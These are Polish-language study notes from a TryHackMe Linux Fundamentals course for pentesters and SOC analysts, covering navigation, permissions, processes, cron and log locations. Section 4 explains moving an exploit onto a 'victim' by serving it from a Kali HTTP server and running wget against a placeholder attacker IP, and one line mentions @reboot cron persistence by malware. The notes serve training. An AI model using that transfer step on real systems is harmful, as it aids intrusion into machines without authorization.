# Linux Fundamentals - Kompletny Przewodnik

Zbiór notatek z modułu Linux Fundamentals (TryHackMe). Kompendium wiedzy dla Pentestera i Analityka SOC.

---

## 1. Podstawy i Nawigacja (Navigation)
Poruszanie się po systemie bez interfejsu graficznego (GUI).

### Kluczowe komendy
* **`whoami`** - Wyświetla nazwę obecnego użytkownika.
* **`pwd`** - (Print Working Directory) Gdzie teraz jestem?
* **`ls`** - Wylistuj pliki w obecnym folderze.
    * `ls -a` - Pokaż też ukryte pliki (zaczynające się od kropki).
    * `ls -l` - Pokaż szczegóły (uprawnienia, właściciel, rozmiar).
    * **`ls -la`** - Kombinacja powyższych (Najczęściej używana).
* **`cd`** - (Change Directory) Zmień folder.
    * `cd nazwa_folderu` - Wejdź do folderu.
    * `cd ..` - Cofnij się o jeden poziom wyżej.
    * `cd` (samo) lub `cd ~` - Wróć do katalogu domowego (/home/user).

### Operacje na plikach
* **`touch plik`** - Stwórz pusty plik.
* **`mkdir folder`** - Stwórz nowy katalog.
* **`cp zrodlo cel`** - Kopiuj plik.
* **`mv zrodlo cel`** - Przenieś plik (służy też do **zmiany nazwy**).
* **`rm plik`** - Usuń plik (ostrożnie, nie ma kosza!).
    * `rm -r folder` - Usuń folder wraz z zawartością.

---

## 2. Operatorzy i Wyszukiwanie (Searching)

### Przekierowania (Redirection)
Kluczowe przy pracy z logami i raportami.
* **`>`** (Nadpisanie): `echo "hello" > plik.txt` (Kasuje starą treść, wpisuje nową).
* **`>>`** (Dopisanie): `echo "hello" >> plik.txt` (Dopisuje nową treść na końcu, stara zostaje).
* **`|`** (Pipe): Przekazuje wynik jednej komendy do drugiej. Np. `cat logi.txt | grep "error"`.

### Szukanie treści i plików
* **`grep "fraza" plik`**: Szukaj konkretnego słowa w pliku.
* **`find / -name "plik"`**: Szukaj pliku o danej nazwie w całym systemie.

---

## 3. Uprawnienia i Użytkownicy (Permissions)

### Przełączanie użytkownika
* **`ssh user@IP`** - Zdalne połączenie z serwerem.
* **`su user`** - Zmień użytkownika (zostaje w starym środowisku/katalogu).
* **`su -l user`** (lub `su -`) - Zmień użytkownika i **załaduj jego pełne środowisko** (Zalecane!).

### Uprawnienia plików (`chmod`)
Domyślnie skrypty hakerskie nie są wykonywalne.
* **Problem:** Błąd `Permission denied` przy próbie `./skrypt.sh`.
* **Rozwiązanie:** `chmod +x skrypt.sh` (Nadaj flagę e**X**ecutable).

---

## 4. Edycja i Transfer Plików (File Transfer)

### Edytory w terminalu
* **`nano`**: Prosty edytor.
    * `Ctrl+O` (Zapisz), `Ctrl+X` (Wyjdź).
* **`vim`**: Zaawansowany edytor.

### Pobieranie i Wysyłanie (Tool Transfer)
Jak przerzucić exploita z Kali na ofiarę?
1.  **Na Kali (Atakujący):** Postaw szybki serwer WWW w folderze z plikami:
    ```bash
    python3 -m http.server 8000
    ```
2.  **Na Ofierze:** Pobierz plik:
    ```bash
    wget http://IP_ATAKUJACEGO:8000/skrypt.sh
    ```

---

## 5. Procesy i Logi (System Management)

### Zarządzanie Procesami
* **`ps aux`**: Pokaż wszystkie aktywne procesy wszystkich użytkowników.
* **`top`**: Menedżer zadań na żywo (użycie CPU/RAM).
* **`kill [PID]`**: Zabij proces o danym ID (np. zawieszony skrypt).

### Automatyzacja (Cron)
* **`crontab -e`**: Edycja harmonogramu zadań.
* **`@reboot`**: Skrót oznaczający "uruchom raz przy starcie systemu" (Często używane przez malware do Persistence).

### Logi Systemowe (Gdzie szukać?)
Katalog **/var/log** to pierwsze miejsce dla analityka SOC.
* `/var/log/auth.log` - Logowania (SSH, sudo).
* `/var/log/syslog` - Ogólne zdarzenia systemowe.
* `/var/log/apache2/access.log` - Kto odwiedzał stronę WWW?

---

## 6. Struktura Katalogów (FHS Cheat Sheet)
* **/bin** - Podstawowe programy (`ls`, `cat`).
* **/etc** - **Pliki konfiguracyjne** (tu edytujemy ustawienia).
* **/home** - Pliki użytkowników.
* **/root** - Katalog domowy administratora.
* **/tmp** - Pliki tymczasowe (znika po restarcie).
* **/var** - Pliki zmienne (logi, www).
